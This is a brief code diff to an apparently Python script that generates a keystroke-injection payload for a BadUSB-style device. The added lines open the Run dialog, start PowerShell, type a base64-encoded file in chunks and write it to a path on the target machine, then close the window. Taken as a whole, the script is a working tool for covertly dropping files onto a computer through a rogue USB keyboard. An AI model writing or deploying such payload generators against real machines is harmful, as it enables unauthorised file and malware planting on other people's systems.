@@ -24,7 +24,10 @@ chunks = [b64[i:i+chunk_size] for i in range(0, len(b64), chunk_size)]
 
 # Write payload
 with open(os.path.basename(file) + ".txt", "w") as f:
+    f.write("Defaultdelay:4350\n")
+    f.write("Press: 131+114\nDelay:1500\nPrintLine:powershell.exe\nDelay:2000\n")
+    f.write("PrintLine:$b=\"\"\n")
     f.write("PrintLine:$b=\"\"\n")
     for chunk in chunks:
         f.write(f"PrintLine:$b+=\"{chunk}\"\n")
-    f.write(f"PrintLine:[IO.File]::WriteAllBytes(\"{remote}\", [Convert]::FromBase64String($b));")
+    f.write(f"PrintLine:[IO.File]::WriteAllBytes(\"{remote}\", [Convert]::FromBase64String($b)); exit;")
